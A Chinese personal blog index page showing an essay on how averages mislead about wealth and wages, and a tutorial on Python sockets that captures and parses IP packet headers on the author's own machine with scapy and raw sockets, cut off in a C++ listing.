<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="gorgeousdays">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="gorgeousdays">
<meta property="og:locale" content="zh_CN">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>gorgeousdays</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">gorgeousdays</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/27/%E8%B0%88%E5%B9%B3%E5%9D%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/27/%E8%B0%88%E5%B9%B3%E5%9D%87/" class="post-title-link" itemprop="url">谈平均</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-01-27 21:41:14 / 修改时间：22:10:21" itemprop="dateCreated datePublished" datetime="2021-01-27T21:41:14+08:00">2021-01-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​         在网上常看到这样一个段子“我、马云、马化腾、王健林资产平均几百亿”。</p>
<p>​         想想还是挺激动的，“我”一个普通人倒也混进这个平均几百亿的圈子里。可其实，有“我”没“我”倒也一样。单就资产而言，“我”可连他们的零头都没有，显然这“我”是被平均了。</p>
<p>​         生活中倒也不乏这样的事情，大多数的人都被平均过。比如全省人均工资多少，全国人均绿化面积多少。少数的高收入的人群平均了大多数低收入的人群，东部的绿化面积平均了西部。人均的绿化面积在西部想是体会不到，但在东部地区却又溢出了。</p>
<p>​        一些公司打广告往往也如此，平均月薪多高多高，可进去之后才发现，几个高管月薪上万，而普通的员工却也只有几千，平均月薪确实高，可都是享受不到的。</p>
<p>​        为什么经常会有平均这个概念呢？为什么很多新闻、报纸都拿平均说事呢？</p>
<p>​        好像有过这样一个段子，“伊万科夫，你为什么要读真理报？”“我读真理报知道我是幸福的。”同样，平均的高水平使低水平的人或者地区充满向往，仿佛自己也将达到这一水平。大多数被平均了，生活水平被抬高了，整个社会也将更幸福了。那些被平的人呢也无法诉苦，鲜明的数据不给人们机会辩驳，大家都实现了，为什么你没有呢？那人们还是得自己找原因啊。自己不努力还是不会谋划，想是总能找到原因。</p>
<p>​         这样的平均也确有好处，人们意识到自身的差距，便开始往平均的线上走，也就带动了整个社会的发展，可到那时候社会的平均线还会上涨吗？如果还会上涨，那大多数人就是追着社会的平均水平过日子了，跟着它后面走，却很难超越。那如果不会呢，也就是社会的平均水平没变，这有上去的就有下来的，那谁下来呢，是那些被平均的人在内卷还是平均别人的人被被平均者打到呢？</p>
<p>​        大多数都是被平均的，那么是谁平均了他们呢？也就是开头谈的马云、王健林等人，可他们自身也无意参与这种平均啊，是别人叫他们给平均了。这些人以前反对农民的平均主义思想，咋么现在又开始平均了呢？</p>
<p>​        为什么呢？因为有用，要是肯定农民的平均主义思想，那自己的东西可不是要被分完了吗？要是现在不用平均的概念，那大家不是看不见美好生活了，那还不乱了套？</p>
<p>​        平均倒也不应只是被书写在纸上的数据，还是要落到实处。其实，被平均只是一分安慰，但也可以拉升我们的希望啊！</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/07/socket%E5%88%9D%E6%8E%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/07/socket%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">socket初探</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-01-07 20:40:51 / 修改时间：20:43:42" itemprop="dateCreated datePublished" datetime="2021-01-07T20:40:51+08:00">2021-01-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E9%A1%B9/" itemprop="url" rel="index"><span itemprop="name">杂项</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>为了实现以下功能</p>
<blockquote>
<p>捕获本机网卡的IP包，对捕获的IP包进行解析。<br>要求必须输出以下字段：版本号、总长度、标志位、片偏移、协议、源地址和目的地址。</p>
</blockquote>
<p>我第一反应就是Python应当有这么一个库可以直接调用，那问题就解决了，通过scapy的确可以实现，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过scapy来获取本机对应网卡的IP报文</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">a = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_callback</span>(<span class="params">packet</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> (packet[<span class="number">6</span>].name == <span class="string">&#x27;IP&#x27;</span>):</span><br><span class="line">            temp = []</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.version)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.ihl)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.tos)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.len)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.id)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.flags)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.frag)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.ttl)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.proto)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.chksum)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.src)</span><br><span class="line">            temp.append(packet[<span class="number">0</span>].payload.payload.payload.payload.payload.payload.dst)</span><br><span class="line">            a.append(temp)</span><br><span class="line">            print(temp)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">filterstr=<span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="comment">#关于sniff的prn参数  指定回调函数，每当一个符合filter的报文被探测到时，就会执行回调函数</span></span><br><span class="line"><span class="comment">#iface参数 用来指定要在哪个网络接口上进行抓包 如若不指定即所有网络接口</span></span><br><span class="line"><span class="comment"># count指定最多嗅探多少个报文（是指符合filter条件的报文，而非所有报文）</span></span><br><span class="line">sniff(filter=filterstr,prn=pack_callback, iface=<span class="string">&#x27; &#x27;</span>, count=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>但这样的实现其实是抓取到了很多信息，通过设定prn对抓取到的信息进行处理提取出我们想要的。那如何才能对IP包进行直接抓取，这就需要用到socket了。</p>
<h5 id="以下是本人对socket的理解，并不确保完全正确。"><a href="#以下是本人对socket的理解，并不确保完全正确。" class="headerlink" title="以下是本人对socket的理解，并不确保完全正确。"></a>以下是本人对socket的理解，并不确保完全正确。</h5><h3 id="何为socket"><a href="#何为socket" class="headerlink" title="何为socket"></a>何为socket</h3><blockquote>
<p>A <strong>network socket</strong> is a software structure within a network node of a computer network that serves as an endpoint for sending and receiving data across the network.      ——<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Network_socket">Wikipedia</a></p>
</blockquote>
<p>前半句话难以理解甚至于比较抽象，但后半句其实说明了Socket即<strong>端</strong>，<strong>端作为网络通信的起点或者终点而存在</strong>。基于socket去获取信息，我们可以不用了解链路中间发生了什么，信息是如何传输的，但我们知道通过socket就是可以得到信息。它就像是API调用就好，可以输出我们想要的，而不必关注它中间做了多复杂的操作。</p>
<p>调用API你需要去传入参数，socket可以说是操作系统提供的一套API。因此创建socket也要向操作系统提交需要创建的socket的信息，然后才能创建一个对应的socket。</p>
<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/1.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">socket抽象层</div> </center>

<h4 id="socket的结构"><a href="#socket的结构" class="headerlink" title="socket的结构"></a>socket的结构</h4><p>一个socket至少包含以下内容</p>
<ol>
<li>本地socket地址：本地主机的ip+端口号。</li>
<li>传输协议：例如TCP、UDP、raw IP等。</li>
</ol>
<p>如果本地socket要与远程主机进行通信，则还有加上远程socket的地址，即远程主机的ip与端口号。</p>
<p>就如同两个人之间用手机进行通信，手机就是socket，它包含电话号码(即本地socket地址)，手机的通信协议(即传输协议)，如果要打电话，那需要对方的电话号码(即远程主机的socket地址)。类比到计算机网络环境，主机就如同人，socket就如同手机。我们并不需要知道拨打电话后发生了什么，我们只知道我们之间的通信建立成功了。</p>
<p>以上便是对socket的比喻描述，但可能并不是很恰当，因为socket创建中本地的socket地址是其固有属性，而电话号码是手机的一个附加属性。</p>
<h4 id="socket的用法"><a href="#socket的用法" class="headerlink" title="socket的用法"></a>socket的用法</h4><p>当我们已经创建好socket之后，我们需要一些操作对socket进行配置，bind,listen,connect…</p>
<p>还是手机的例子，有了手机(有了socket)，首先要再本机的多个号码中配置要用的一个(为socket关联本地地址，bind)，要打电话就要输电话号码(与远程socket建立连接,connect)，接电话(accept)。</p>
<h3 id="socket的python实现"><a href="#socket的python实现" class="headerlink" title="socket的python实现"></a>socket的python实现</h3><p>所以我们的目的其实就是创建socket，然后根据要求使用socket</p>
<h4 id="创建socket"><a href="#创建socket" class="headerlink" title="创建socket"></a>创建socket</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">socket.socket(family&#x3D;AF_INET, type&#x3D;SOCK_STREAM, proto&#x3D;0, fileno&#x3D;None)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>family</code>-用于指定socket的地址类型。常见由<code>AF-INET</code>和<code>AF-INET6</code>,分别表示IPv4和IPv6，AF即<code>Address Family</code>。</li>
<li><code>type</code>-用于指定socket类型。主要有以下类型<ol>
<li><code>SOCK_STREAM</code>：使用TCP或STCP协议，面向连接的socket</li>
<li><code>SOCK_DGRAM</code>：使用UDP协议，面向无连接的socket</li>
<li><code>SOCK_RAW</code>：原始套接字。这类socket，数据包将绕过运输层，因此可以在应用层得到数据包的头部</li>
</ol>
</li>
<li><code>proto</code>-协议号通常为零,可以省略。这相当于为指定协议在运输层打开一个缺口，从而在运输层放行该协议的包。IPPROTO_TCP 、 IPPROTO_IP 、IPPROTO_UDP代表三种不同的协议，分别代表IP协议族里面的TCP协议、IP协议和UDP协议。</li>
<li><code>fileno</code>-如果指定了fileno,则其他参数将被忽略,导致带有指定文件描述符的套接字返回。</li>
</ul>
<h4 id="使用socket"><a href="#使用socket" class="headerlink" title="使用socket"></a>使用socket</h4><p>关于socket的使用，按使用协议的不同可以分为TCP通信和UDP通信，按使用场景不同，又可以分为客户端与服务器端。</p>
<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/3.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">基于TCP的socket通讯流程图</div> </center>

<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/4.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">基于UDP的socket通讯流程图</div> </center>

<h4 id="socket基本函数"><a href="#socket基本函数" class="headerlink" title="socket基本函数"></a>socket基本函数</h4><ul>
<li><code>socket.bind(adress)</code> - 该函数将socket绑定到一个地址上，为socket关联一个相应的IP和端口号。要注意2点：1. 一个socket只能绑定到一个地址上，不能重复绑定；2. 地址格式必须与创建socket时指定的一致，例如不能将INET socket绑定到INET6 socket上</li>
<li><code>socket.listen([backlog])</code> - 启动监听，即允许服务器接受连接。backlog参数用于指定最大连接数，一旦服务器达到最大连接数，之后的连接都将被拒绝。backlog参数的大小，决定了TCP服务器的连接请求队列大小，进一步影响客户端连接请求的成功与否。</li>
<li><code>socket.connect(address)</code> - 与远程socket建立连接。只有使用TCP才需要建立连接，UDP是无连接的。</li>
<li><code>socket.accept()</code> - 接受一个连接。其返回值是<code>(conn, address)</code>，其中conn是是一个新的socket对象，用于与建立连接的socket收发数据，address则作为远程socket地址绑定到该socket上。原始socket与主机的一个端口绑定，但并不意味着socket占用了该端口，而是向TCP\IP协议栈声明了其对80端口的占用。新创建的socket使用的端口是不变的，这并不意味着端口占用。而是因为<strong>socket只是对TCP/IP协议栈操作的抽象，而不是简单的映射关系</strong>。</li>
<li><code>socket.send(bytes)</code>/<code>socket.sendto(bytes[,flags], address)</code> - 向远程socket发送数据，注意，必须以bytes格式发送。而使用<code>sendto</code>时，要指名目的socket的地址。</li>
<li><code>socket.recv(bufsize[, flags])</code>/<code>socket.recvfrom(bufsize[, flags])</code> - 从socket接收数据，通过<code>bufsize</code>指定一次性接收数据的最大量，<code>recv</code>的返回值是bytes对象，而<code>recvfrom</code>的返回值是<code>(data, address)</code>，address即为发送数据的socket地址。</li>
</ul>
<h4 id="socket实现服务器端与客户端通信"><a href="#socket实现服务器端与客户端通信" class="headerlink" title="socket实现服务器端与客户端通信"></a>socket实现服务器端与客户端通信</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 服务器端</span><br><span class="line">import socket</span><br><span class="line"># 创建socket</span><br><span class="line">with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">    s.bind((&quot;127.0.0.1&quot;, 56789))  # 绑定地址，如前所述，socket地址由ip地址与port组成</span><br><span class="line">    s.listen(1)  # 启动监听，并设置最大连接数为1</span><br><span class="line">    conn, addr &#x3D; s.accept()  # 接受连接，并将返回的新socket与addr info分别储存</span><br><span class="line">    with conn:</span><br><span class="line">        print(&#39;Connected by&#39;, addr)  # 在本地打印信息，测试用</span><br><span class="line">        while True:</span><br><span class="line">            data &#x3D; conn.recv(65565)  # 65535是一次性能接收的最大值</span><br><span class="line">            if not data:</span><br><span class="line">                break</span><br><span class="line">            conn.send(data)  # 将数据原样发回</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">#客户端</span><br><span class="line">import socket</span><br><span class="line"># 创建socket with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">    s.connect((&quot;127.0.0.1&quot;, 56789))  # 连接到另一个socket     </span><br><span class="line">    s.send(b&#39;Hello, socket&#39;)  # 向对方socket发送数据     </span><br><span class="line">    data &#x3D; s.recv(65565)</span><br><span class="line">print(&#39;Received&#39;, str(data))  # 打印收到的数据 </span><br></pre></td></tr></table></figure>
<p>以上代码实现了在本机范围内的通信，修改IP为远程服务器IP即可与远程服务器建立连接。</p>
<h3 id="Package-analyse"><a href="#Package-analyse" class="headerlink" title="Package analyse"></a>Package analyse</h3><p>在此我们需要为设置socket的类型为原始套接字，并为其指定协议IPPROTO_TCP表明要抓取TCP协议报文。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#demo</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    while True:</span><br><span class="line">        print(s.recvfrom(65565))</span><br></pre></td></tr></table></figure>
<p>recvfrom返回data和address。data部分由<code>IP header + TCP header + data</code>组成，于是我们基于对socket的理解，便可以着手去用socket抓取IP报文，并对IP报文报头进行分析。</p>
<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/5.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">IP数据包格式</div> </center>

<p>通过如下处理便可以得到IP报文首部的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        raw_packet = s.recvfrom(<span class="number">65565</span>)</span><br><span class="line">        packet = raw_packet[<span class="number">0</span>]</span><br><span class="line">        raw_iph = packet[<span class="number">0</span>:<span class="number">20</span>]</span><br><span class="line">        <span class="comment"># unpack(fmt, buffer) - 根据指定的格式化字符串来拆解给定的buffer</span></span><br><span class="line">        <span class="comment"># B 单字节的整型</span></span><br><span class="line">        <span class="comment"># H 双字节的整型</span></span><br><span class="line">        <span class="comment"># s bytes，前加数字表示取4字节的bytes</span></span><br><span class="line">        iph = unpack(<span class="string">&quot;!BBHHHBBH4s4s&quot;</span>, raw_iph)</span><br><span class="line">        fields = &#123;&#125;</span><br><span class="line">        fields[<span class="string">&quot;Version&quot;</span>] = iph[<span class="number">0</span>] &gt;&gt; <span class="number">4</span>    <span class="comment"># 版本字段与IP数据报头部共享一个字节，通过右移操作取得单独的版本字段</span></span><br><span class="line">        fields[<span class="string">&quot;IP Header Length&quot;</span>] = (iph[<span class="number">0</span>] &amp; <span class="number">0xF</span>) * <span class="number">4</span>    <span class="comment"># 首部长度字段的1代表4个字节</span></span><br><span class="line">        fields[<span class="string">&quot;Type of Service&quot;</span>] = iph[<span class="number">1</span>]    <span class="comment"># 区分服务，一般情况下并不使用</span></span><br><span class="line">        fields[<span class="string">&quot;Total Length&quot;</span>] = iph[<span class="number">2</span>]    <span class="comment"># IP首部+数据的总长度，即len(packet)</span></span><br><span class="line">        fields[<span class="string">&quot;Identification&quot;</span>] = iph[<span class="number">3</span>]    <span class="comment"># 标识</span></span><br><span class="line">        flags = iph[<span class="number">4</span>] &gt;&gt; <span class="number">13</span>    <span class="comment"># 标识位与片偏移共享2个字节，且最高位并且未使用</span></span><br><span class="line">        fields[<span class="string">&quot;MF&quot;</span>] = <span class="number">1</span> <span class="keyword">if</span> flags &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>    <span class="comment"># 测试最低位</span></span><br><span class="line">        fields[<span class="string">&quot;DF&quot;</span>] = <span class="number">1</span> <span class="keyword">if</span> flags &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>    <span class="comment"># 测试中间位</span></span><br><span class="line">        fields[<span class="string">&quot;Fragment Offset&quot;</span>] = iph[<span class="number">4</span>] &amp; <span class="number">0x1FFF</span>    <span class="comment"># 位与操作取得片偏移</span></span><br><span class="line">        fields[<span class="string">&quot;Time to Live&quot;</span>] = iph[<span class="number">5</span>]    <span class="comment"># 生存时间，单位是跳数</span></span><br><span class="line">        fields[<span class="string">&quot;Protocol&quot;</span>] = iph[<span class="number">6</span>]    <span class="comment"># 数据报携带的数据使用的协议，TCP为6</span></span><br><span class="line">        fields[<span class="string">&quot;Header Checksum&quot;</span>] = iph[<span class="number">7</span>]    <span class="comment"># 首部校验和</span></span><br><span class="line">        <span class="comment"># socket.inet_ntoa(..)</span></span><br><span class="line">        <span class="comment"># - convert an ip address from 32-bit packed binary format to string format</span></span><br><span class="line">        fields[<span class="string">&quot;Source Address&quot;</span>] = socket.inet_ntoa(iph[<span class="number">8</span>])</span><br><span class="line">        fields[<span class="string">&quot;Destination Address&quot;</span>] = socket.inet_ntoa(iph[<span class="number">9</span>])</span><br></pre></td></tr></table></figure>
<p>通过上述代码的解析我们可以获取到IP首部，同理我们也可以去解析TCP首部。</p>
<p>我们为其指定协议为IPPROTO_TCP，可以获取TCP报文，但如果采用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))</span><br></pre></td></tr></table></figure>
<p>来创建socket，便可以获取信息更全面的数据包，<code>ethernet frame header + IP header+ inner-Protocol header+data</code>。再对各个部分进行切片操作，根据报文格式进行提取，就可以实现对本机所有以太网帧的捕获与分析了！</p>
<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="/2021/01/07/socket%E5%88%9D%E6%8E%A2/6.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">数据报格式</div> </center>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了实现socket编程，起初尝试用C++完成任务，学习网上的代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 